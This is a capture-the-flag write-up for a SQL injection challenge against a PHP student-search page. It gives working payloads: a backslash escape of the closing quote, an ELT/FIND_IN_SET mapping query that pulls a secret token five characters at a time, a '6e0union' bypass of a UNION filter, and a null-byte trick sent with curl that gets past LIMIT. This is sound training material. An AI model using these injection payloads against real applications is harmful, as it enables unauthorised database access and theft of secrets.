## Writeup
### Intended solution
The give patch shows that some security mechanism were added. One of them was a blacklist that filters some chracters in the search string:
```php
$blacklist = array('\'', '"', '/', '*');
return str_replace($blacklist, '', $input);
```
But this sanitize function is incomplete and doesn't filter the backslash character, which allows us to escape the last single quote where the search query is inserted, like so:
```MySQL
WHERE first_name='injection here and escape last quote like so # \'
OR last_name='injection here and escape last quote like so \'
ORDER BY id ASC LIMIT 5
```

This allows us to do a SQL injection, but the problem is that we couldn't use 'union' because it is being detected and and exception is thrown (or not, see the unintended solution section).
Another limitation is the 'LIMIT 5' at the end, which we can't bypass because there is a newline between the injection and the limit statement and we can only perform single line comments (or not, see the second unintended solution).

Furthermore, the patch also introduces as token which changes after every 10 requests, that means that we have to perform an injection that allows us to extract the token in less than 10 requests.
It was also possibel to retrieve a database dump from the students, by navigating to the panels section (it was hidden as a HTML comment), this dump will be usful for the final injection query.

How do we extract a 40 chracter string using the above injection in less than 10 tries?!

The idea is to create a mapping between user id (given as a search result) and a character in the string as well as the string position. For example, when the student with ID 1 is returned, that means that we have chracter 'a' at the first posiiton in the string, if student with ID 20 is returned that would mean that the second position in the string is an 'a'. This allows us to read 5 chracters at a time (with enough students to create the mapping).

This could be the mapping for the first position in the string, so if one of these IDs is returned we know which chracter is at the first position.
| 1 | 3 | 4 | 6 | 7 | 10 | 11 | 13 | 14 | 16 | 18 | 19 | 20 | 21 | 22 | 23|
|---|---|---|---|---|----|----|----|----|----|----|----|----|----|----|---|
| a | b | c | d | e | f  | 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | 8  | 9 |

To do this kind of mapping in MySQL we can use the functions **ELT** and **FIND_IN_SET**

So our injection will look like this:
```
 OR id IN (<mapping right here>)
```

Here is what the mapping looks like from my exploit (for the first 5 chracters of the token):
```
 OR id IN (
 (select elt((select find_in_set((select substring(token, 1, 1) from tb8210aa9c07bdd4),0x612c622c632c642c652c662c302c312c322c332c342c352c362c372c382c39)),1,2,3,4,5,6,7,8,9,11,12,14,16,17,20,24)),
 (select elt((select find_in_set((select substring(token, 2, 1) from tb8210aa9c07bdd4),0x612c622c632c642c652c662c302c312c322c332c342c352c362c372c382c39)),25,26,27,31,32,33,34,35,36,37,38,39,40,41,42,43)),
 (select elt((select find_in_set((select substring(token, 3, 1) from tb8210aa9c07bdd4),0x612c622c632c642c652c662c302c312c322c332c342c352c362c372c382c39)),44,45,46,47,48,49,50,51,52,53,55,56,57,58,59,60)),
 (select elt((select find_in_set((select substring(token, 4, 1) from tb8210aa9c07bdd4),0x612c622c632c642c652c662c302c312c322c332c342c352c362c372c382c39)),61,62,63,64,66,67,69,70,71,72,73,74,75,76,77,78)),
 (select elt((select find_in_set((select substring(token, 5, 1) from tb8210aa9c07bdd4),0x612c622c632c642c652c662c302c312c322c332c342c352c362c372c382c39)),79,80,81,82,83,84,85,89,90,91,92,93,94,95,96,97))
 ) # \
```

The above statement is one request and returns 5 chracters, we can repeat that 7 more times to get the rest of the 35 chracters.

### Unintended solution
Unfortunately there is also an unintended solution (which I didn't know about that that could actually work) which bypasses the union check.
It can be bypassed with some MySQL madness (I have no idea why this even works), which I didn't know about even existed, so something new is learned, but it made the challenge easier than expected :/

```
or 1=6e0union select 1,2,3 #\
```

I hope you still had fun working on it.

### Unintended solution 2
It was actually possible to bypass the 'LIMIT 5' by ending the payload with a semicolon followed by a null byte and the the backslash.

The backslash will escape the end of quote.
The null byte will kill the stream because mysql_query() would interpret it as EOS.
The semicolon will tell the database it is the end of the request.

```
MySQL
WHERE first_name='injection here and escape last quote like so ;\x00\'
OR last_name='injection here and escape last quote like so ;\x00\'
ORDER BY id ASC LIMIT 5
```
######Using cURL
```
curl -X POST --data "name= OR id=<injection>;%00\&site=default&action=search" <Website> 
```
Using this technique allowed the output of 160 ids at the time, making the challenge possible to solve in a single request with the "intended" way using mapping.
